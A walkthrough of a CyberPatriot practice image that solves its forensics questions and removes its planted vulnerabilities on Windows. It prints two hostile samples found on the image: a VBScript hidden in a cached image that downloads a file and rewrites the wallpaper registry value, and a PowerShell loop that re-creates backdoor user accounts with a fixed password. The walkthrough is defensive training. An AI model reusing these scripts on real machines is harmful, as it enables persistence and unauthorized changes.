---
title: "My Little Pony Walkthrough"
date: 2023-11-15
description: "A walkthrough for the my little pony cyberpatriot practice image."
tags: ["CyberPatriot", "Walkthrough"]
type: post
weight: 20
showTableOfContents: true
---

## Forensics

### Forensics 1

Question:

They are at it again. The users keep on sending each other these stupid secret notes.
This goes against our policies so please figure out what their secret notes say and
report them here.

For this report please figure out the full plain-text and key used in the “xor” file.
We also know that part of the plaintext is "For honesty no pony can deny".

EXAMPLE KEY: Il0v3P0n1es

EXAMPLE PLAINTEXT: Who doesn't like ponies?

KEY:

PLAINTEXT:

---

First of all, to make our lives easier, let's download and install the Everything tool from voidtools](https://www.voidtools.com/). Then, searching for 'xor', we find `C:\Users\Rarity\Documents\xor.txt`, the secret note mentioned in the forensics. The content of the file is the following:

```hex
045c0117375a065524364a53593015185f393b13105631150c55393b1f534e30404851252713075f3a152940272e5619563c5e485f31625e0a173a4c0d
```

To solve this forensics problem, we will need to know some fundamentals of **xor** operations.

Let $P \coloneqq \text{plaintext}$, $K \coloneqq \text{key}$, and $C \coloneqq \text{ciphertext}$

Utilizing the associative property of xor, we can derive that $C \oplus P = K$.

Now noting that we have a part of the plaintext, `For honesty no pony can deny`, and assuming that the key is shorter than the text, we can use the above equation and CyberChef to obtain a constantly repeating sequence of the key.

![cyberchef](/images/My-Little-Pony-Walkthrough/cyberchef.png)

Key = `B3s7_5h0W`

Finally, we can now use the equation $C \oplus K = P$ to obtain the complete plaintext.

Plaintext = `For honesty no pony can deny, you are the Applejack of my eye`

### Forensics 2

Question:

They are at it again. The users keep on sending each other these stupid secret notes.
This goes against our policies so please figure out what their secret notes say and
report them here.

For this report please figure out the secret message encoded in the “polyglot” file.

EXAMPLE: This is a secret message

ANSWER:

---

Searching for `polyglot` reveals a pdf located at `C:\Users\Pinkie Pie\AppData\Local\Microsoft\Windows\Notes\polyglot.pdf`. The file is *super hidden*, which is just a way of saying it has been flagged as an operating system file, making it hidden even if you have View Hidden Files turned on. Make sure to disable hiding operating system files in File Explorer by going to View->Options->View and unchecking `Hide protected operating system files (recommended).`

Polyglot files are essentially files that share two different extensions. In our case, we have a pdf that is also a zip file. Renaming polyglot.pdf to polyglot.zip and extracting the file reveals a text file containing the answer.

Answer = `Polyglot Files Are Awesome Just Like Rarity!`

### Forensics 3

They are at it again. The users keep on sending each other these stupid secret notes.
This goes against our policies so please figure out what their secret notes say and
report them here.

For this report please figure out the secret message encoded in the “scanme” file.

EXAMPLE: This is a secret message

ANSWER:

---

Searching for 'scanme' finds a text file located at `C:\Users\Fluttershy\AppData\Local\Microsoft\QuestRose\scanme.txt`. Opening the file gives a long base64 string. Decoding this string with a tool like Cyberchef gives us the following:

```text
000000011010010000000
011111010011110111110
010001011010110100010
010001010010010100010
010001011101110100010
011111010000110111110
000000010101010000000
111111111101111111111
000001000010001010101
000110111110101000010
001101000000110011100
100000100001101000111
110000010100001111011
111111110111001010011
000000010101000010101
011111011010111000010
010001010100000010010
010001010101001110001
010001010001000011111
011111010111101000100
000000010011011111101
```

Considering the name *scanme* and the formatting, we can tell this represents a QR code. Using a tool like [Dcode's binary to image tool](https://www.dcode.fr/binary-image) with a width of 21, we can obtain a QR code, which, after scanning, gives the answer.

Answer = `luna best pony`

### Forensics 4

Question:

One of the users went against our policies and decided to install discord on the system.
Then they proceeded to login to their account and download an image sent to them by a
stranger. This set off windows defender causing the user to panic and sign out of discord.
Windows defender deleted the downloaded file so we no longer have access to it. What we do
know is that there was a piece of embedded VBScript in the picture that attempted to change
the wallpaper on the computer to something else using a very old vulnerability in ActiveX.
Of course this is a false positive since a picture file can’t just be executed normally so
there is no need to worry about it. Please find the name of the file that the script attempts
to set as the wallpaper.

EXAMPLE: pony.png

ANSWER:

---

Discord caches images you receive at `C:\Users\Applejack\AppData\Roaming\discord\Cache`. Traveling to this directory and opening the latest cache `f_000020` in Notepad, we see the PNG file header indicating the cache is off. However, remember that the image we are looking for is different from the cached image. Scrolling to the bottom of the cache, we see this script:

```vb
Set objShell = CreateObject("WScript.Shell")
Set objEnv = objShell.Environment("User")

strDirectory = objShell.ExpandEnvironmentStrings("%temp%")

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/812402791904968784/1054272188842258452/cute_donkey.jpg?v=1", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\myImage.png", 2 '//overwrite
end with

objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", strDirectory + "\myImage.png"
objShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
```

Looking at the code we see that the script is downloading the image from `https://cdn.discordapp.com/attachments/812402791904968784/1054272188842258452/cute_donkey.jpg?v=1` indicating that the filename is `cute_donkey.jpg`.

Answer = `cute_donkey.jpg`

### Forensics 5

Question:

One of the users has configured a task to run every minute on the system. Each time this
task is run a bunch of system features are disabled which make using the system unusable
for the users. To fix these issues the admin has to continuously go into the registry
and manually change the value, only for the issues to come back 1 minute later. However
removing this task didn’t seem to fully fix the issue as it would periodically happen
again. We returned the task for you to be able to properly examine. What is the name of
the file that is at the root of this issue?

EXAMPLE: somefile.dll

ANSWER:

---

First of all, we need to stop this task so we can utilize admin tools. We still have access to the registry, so we can delete the key that is disabling us from opening certain tools here: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun`. Deleting the DisallowRun key enables us to open task schedules and disable the malicious task. However, looking at the task reveals that it is only applying group policy with 'gpupdate /force'.

Looking through the group policy, we find suspicious settings called **Extreme Security**. These are definitely not default group policy options. Group policy templates are stored in `C:\Windows\PolicyDefinitions`, so by going there and looking through, we find `Queen.admx`, the source of our problems.

Answer: `Queen.admx`

### Forensics 6

Question:

We have found three different unauthorized changeling users on the system. For some
reason shortly after we delete these users they manage to come back onto the machine.
For now can you please find these three changelings' plaintext password?

EXAMPLE: AllHa1lTh3Qu33n!

ANSWER:

---

Using Autoruns by Sysinterals, we can try and find this script. Autoruns detects a malicious service called `queen` on the system whose image points to `C:\Users\Fluttershy\AppData\Local\Microsoft\Windows\Safety\WinSW-x64.exe`. Going to the directory of this file, we find another file called 'queen.xml', which, after inspection in Notepad, reveals the location of a powershell script at `C:\Users\Fluttershy\AppData\Roaming\Microsoft\Protect\Security\queenservice.ps1`. Opening this script in Notepad reveals:

```powershell
while ($true){
  Del C:\Windows\system32\GroupPolicy\User\Registry.pol
  Del C:\Windows\system32\GroupPolicy\gpt.ini
  Copy-Item "C:\Users\Fluttershy\AppData\Roaming\Microsoft\Windows\Templates\gpt.ini" -Destination "C:\Windows\system32\GroupPolicy"
  Copy-Item "C:\Users\Fluttershy\AppData\Roaming\Microsoft\Windows\Templates\Registry.pol" -Destination "C:\Windows\system32\GroupPolicy\User"
  gpupdate /force
  net user 'Changeling1' Y0uH@v1ngFuNY37? /add /Y
  net user 'Changeling2' Y0uH@v1ngFuNY37? /add /Y
  net user 'Changeling3' Y0uH@v1ngFuNY37? /add /Y
  Start-Sleep -Seconds 30
}
```

Reading the code, we can see what the password is for the changelings.

Answer = `Y0uH@v1ngFuNY37?`

## Vulnerabilites

For the sake of simplicity, we'll go a bit out of order.

## Prohibited Files: 3

Just delete all the secret notes from the forensics.
`C:\Users\Pinkie Pie\AppData\Local\Microsoft\Windows\Notes\polyglot.pdf`
`C:\Users\Fluttershy\AppData\Local\Microsoft\QuestRose\scanme.txt`
`C:\Users\Rarity\Documents\xor.txt`

## Unwanted Software: 3

Uninstall or delete Discord at `C:\Users\Applejack\AppData\Local\Discord\app-1.0.9008\Discord.exe`. You may have noticed that the command prompt was replaced by a fake one that doesn't work. Just go and delete it at `C:\Windows\SysWOW64\cmd.exe`. Finally, there is a game located at `C:\Users\Twilight Sparkle\Saved Games\T-3Portable`. If you try to delete it normally, you won't be able to due to permissions. However, what's more interesting about this game folder is that it has a system integrity level, which means that only the system (or higher technically) can change its permissions, so you can't even take ownership and add permissions. The fastest way to delete it is to run PsExec, run PowerShell as the system user, and delete it like that.

## Malware: 2

First, delete `C:\Windows\PolicyDefinitions\Queen.admx` for the malicious group policy extension.

For the service, first stop it and delete `C:\Users\Fluttershy\AppData\Roaming\Microsoft\Protect\Security\queenservice.ps1` and `C:\Users\Fluttershy\AppData\Local\Microsoft\Windows\Safety\*`.

## User Auditing: 2

Opening up `lusrmgr.msc` results in a blank page, and trying to run `net user` will return an error. There are two things that are causing this.

For the first issue, you could simply run 'sfc /scannow'  or any similar action. However, for this walkthrough, we'll go a bit more in depth for the sake of it. A tool that can be very helpful in these situations is Procmon by Sysinternals. Procmon will allow you to view all the actions certain processes are taking on the system. In this case, we will choose the most specific process to narrow our search, `net.exe`.

We can apply a filter by pressing `Ctrl + L`, clear with `Ctrl + X`, and stop/start capturing with `Ctrl + E`. In the filter menu, we will select to filter by process name and set it to net.exe. Then, after clearing and running `net user` in PowerShell, we can see a bunch of events. Looking through, we don't really see anything that could be breaking it; however, it is apparent that net.exe is calling another process, `net1.exe`. So let's analyze that next.

Filtering for net1.exe and doing the same process, we see something interesting. There appears to be a file called `samlib.dll` that net1.exe searches for but doesn't find.

Now to fix this, if you had a baseline of system32, you might have detected that `samlib.dll` has been renamed to `QueenSam.dll` so a simple rename would fix this issue. However, it's much simpler to just run SFC and be done with it.

For the second problem, a quick glance through the SAM registry reveals that there are no permissions on `HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\Queen Chrysalis`. To fix this, just enable inheritance on the registry key.

Now for the actual vulnerabilities, just remove `Queen Chysalis`(1 user auditing) and remove the `ChangelineX` users plus the users whose names are almost identical to authorized users (1 user auditing). To tell the difference, just highlight their names, and you'll see an invisible character at the end of the changelings.

You might have to restart.

## Application Security: 3

```text
Require SSL connections for FTP
FTP logon restrictions: enabled
Anonymous Authentication: disabled
```

## Defensive Countermeasures: 1

To fix Windows Defender, just rename `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2211.5-0\PonyEng.exe` to `MsMpEng.exe`. It's a bit tricky to do this because Windows Defender is a protected process. I personally just used Process Hacker and ran PowerShell with TrustedInstaller-level privileges and renamed Whatever works works, though.

## Local Policy: 2

Secpol templates are stored here: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SecEdit\Reg Values`. Going there in the registry reveals there are not enough permissions on the key. Fix it, and you should have access to Secpol settings.

```text
Do not require CTRL+ALT+DEL: disabled
Restrict anonymous access to named pipes: enabled
```

## Account Policy: 1

```text
Store passwords using reversible encryption: disabled
```

## Uncategorized OS Settings: 1

```text
Turn Off Autoplay: enabled
```
